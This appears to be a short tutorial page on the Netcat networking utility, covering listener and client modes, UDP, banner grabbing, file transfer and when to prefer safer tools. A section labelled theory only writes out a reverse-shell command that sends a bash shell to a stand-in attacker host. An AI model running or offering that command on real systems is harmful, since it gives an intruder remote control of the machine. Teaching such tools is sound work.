Netcat (nc)

Concepts, commands, and correct decision-making

What is Netcat?

Netcat (nc) is a low-level networking utility that reads and writes data over TCP and UDP connections. It is often called the “Swiss Army knife of networking”.

  • Raw TCP/UDP communication
  • Client and listener modes
  • No encryption, no authentication

Mental Model (Important)

STDIN  →  Network Socket  →  STDOUT

Netcat does not understand protocols. It simply moves bytes.

Client vs Listener Mode

Listener

nc -lvp 4444

Client

nc 127.0.0.1 4444

TCP vs UDP

nc -u host port

UDP is connectionless. No response does not always mean failure.

Banner Grabbing

nc target.com 80
GET / HTTP/1.1
Host: target.com

File Transfer (Concept)

nc -lvp 4444 < file.txt
nc host 4444 > file.txt

Reverse Shell (Theory Only)

nc -e /bin/bash attacker_ip 4444

Often disabled in modern systems due to high risk.

When SHOULD You Use Netcat?

Question: Do you need raw, manual interaction with a service?

↓

YES

  • CTF challenges
  • Testing custom protocols

↓

Use Netcat

When SHOULD You NOT Use Netcat?

Question: Do you need encryption, authentication, or safety?

↓

YES

  • Production environments
  • Sensitive data transfer
  • Long-lived connections
  • Public servers

↓

Do NOT use Netcat

What to Use Instead

  • SSH / SCP – encrypted remote access
  • curl / wget – controlled HTTP interaction
  • Nmap – structured scanning
  • Socat – advanced Netcat replacement

Netcat vs Nmap

Netcat is manual and raw. Nmap is automated and protocol-aware.

Interview-Ready Summary

Netcat is a low-level networking tool for manual TCP/UDP interaction. It is powerful for debugging and testing, but unsafe for production due to lack of encryption and authentication.
